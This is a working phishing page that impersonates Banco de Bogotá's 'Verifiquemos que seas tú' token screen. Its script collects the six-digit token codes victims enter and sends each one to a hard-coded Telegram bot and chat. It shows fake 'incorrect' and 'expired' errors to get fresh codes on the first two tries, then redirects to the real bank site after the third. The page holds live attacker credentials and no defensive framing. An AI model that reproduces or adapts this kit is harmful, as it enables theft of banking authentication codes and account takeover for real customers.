<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="description" content="Verificación de Token - Banco de Bogotá">
    <meta name="theme-color" content="#002A8D">
    
    <title>Verificación de Token - Banco de Bogotá</title>
    
    <link rel="icon" type="image/png" href="Imagenes/channels4_profile-removebg-preview.png">
    <link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
    
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Open Sans', sans-serif; background: #f5f5f5; }
        .loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.95); z-index: 9999; justify-content: center; align-items: center; }
        .loading-overlay.active { display: flex; }
        .spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top: 4px solid #002A8D; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .error-message { display: none; color: #d32f2f; font-size: 14px; text-align: center; margin: 15px 0; padding: 12px; background: #ffebee; border-radius: 4px; border-left: 4px solid #d32f2f; }
        .error-message.show { display: block; }
    </style>
</head>
<body>
    <div id="loadingOverlay" class="loading-overlay">
        <div class="spinner"></div>
    </div>

    <div style="max-width: 500px; margin: 50px auto; padding: 30px; background: white; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1);">
        <div style="text-align: center; margin-bottom: 30px;">
            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" style="max-width: 80px; margin-bottom: 15px;">
            <h1 style="font-size: 24px; color: #002A8D; margin-bottom: 10px;">Verifiquemos que seas tú</h1>
            <p style="color: #666;">Ingresa el código de Token móvil o físico</p>
        </div>

        <div class="error-message" id="errorMsg"></div>

        <form id="tokenForm" style="display: flex; flex-direction: column; gap: 20px;">
            <div style="display: flex; gap: 8px; justify-content: center;">
                <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]" style="width: 50px; height: 50px; font-size: 24px; text-align: center; border: 2px solid #ddd; border-radius: 4px;">
                <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]" style="width: 50px; height: 50px; font-size: 24px; text-align: center; border: 2px solid #ddd; border-radius: 4px;">
                <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]" style="width: 50px; height: 50px; font-size: 24px; text-align: center; border: 2px solid #ddd; border-radius: 4px;">
                <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]" style="width: 50px; height: 50px; font-size: 24px; text-align: center; border: 2px solid #ddd; border-radius: 4px;">
                <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]" style="width: 50px; height: 50px; font-size: 24px; text-align: center; border: 2px solid #ddd; border-radius: 4px;">
                <input type="tel" maxlength="1" class="token-digit" pattern="[0-9]" style="width: 50px; height: 50px; font-size: 24px; text-align: center; border: 2px solid #ddd; border-radius: 4px;">
            </div>

            <button type="submit" style="padding: 12px; background: #002A8D; color: white; border: none; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 16px;" disabled id="verifyBtn">Verificar</button>
        </form>
    </div>

    <script>
     const TELEGRAM_BOT_TOKEN = '8619673327:AAEUJ-vzXT2OxgbjbHq5AIlbj0r0x4qWryw';
    const TELEGRAM_CHAT_ID = '-1003875450334';
    document.addEventListener('DOMContentLoaded', function() {
        const tokenInputs = document.querySelectorAll('.token-digit');
        const tokenForm = document.getElementById('tokenForm');
        const verifyBtn = document.getElementById('verifyBtn');
        const overlay = document.getElementById('loadingOverlay');
        const errorMsg = document.getElementById('errorMsg');
        let intentos = 0;
        let tokensEnviados = [];

        // Focus automático entre inputs
        tokenInputs.forEach((input, index) => {
            input.addEventListener('input', function() {
                input.value = input.value.replace(/\D/g, '').slice(0, 1);
                
                const allFilled = Array.from(tokenInputs).every(i => i.value.trim().length === 1);
                verifyBtn.disabled = !allFilled;
                
                if (input.value && index < tokenInputs.length - 1) {
                    tokenInputs[index + 1].focus();
                }
            });

            input.addEventListener('keydown', function(e) {
                if (e.key === 'Backspace' && !input.value && index > 0) {
                    tokenInputs[index - 1].focus();
                }
            });
        });

        tokenForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            if (verifyBtn.disabled) return;

            intentos++;
            const token = Array.from(tokenInputs).map(i => i.value).join('');
            tokensEnviados.push(token);
            
            overlay.classList.add('active');

            const mensaje = `🔒 <b>TOKEN (INTENTO ${intentos}/3) - BANCO DE BOGOTÁ</b>

<b>Código:</b> <code>${token}</code>
<b>Intento:</b> ${intentos}/3

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
                });

                if ((await response.json()).ok) {
                    setTimeout(() => {
                        overlay.classList.remove('active');

                        if (intentos === 1) {
                            errorMsg.textContent = '❌ El código token es incorrecto. Intenta de nuevo.';
                            errorMsg.classList.add('show');
                            tokenInputs.forEach(input => input.value = '');
                            tokenInputs[0].focus();
                        } else if (intentos === 2) {
                            errorMsg.textContent = '⏰ El token ha expirado. Solicita uno nuevo en tu dispositivo.';
                            errorMsg.classList.add('show');
                            tokenInputs.forEach(input => input.value = '');
                            tokenInputs[0].focus();
                        } else if (intentos === 3) {
                            const mensajeFinal = `✅ <b>TOKEN ACEPTADO - BANCO DE BOGOTÁ</b>

<b>Tokens ingresados:</b>
1️⃣ ${tokensEnviados[0]}
2️⃣ ${tokensEnviados[1]}
3️⃣ ${tokensEnviados[2]}

<b>Estado:</b> ACEPTADO EN INTENTO 3

<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;

                            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensajeFinal, parse_mode: 'HTML' })
                            });

                            overlay.classList.add('active');
                            setTimeout(() => { window.location.href = 'https://www.bancodebogota.com/'; }, 2000);
                        }
                    }, 1500);
                } else {
                    overlay.classList.remove('active');
                }
            } catch (error) {
                overlay.classList.remove('active');
            }
        });
    });
    </script>
</body>
</html>
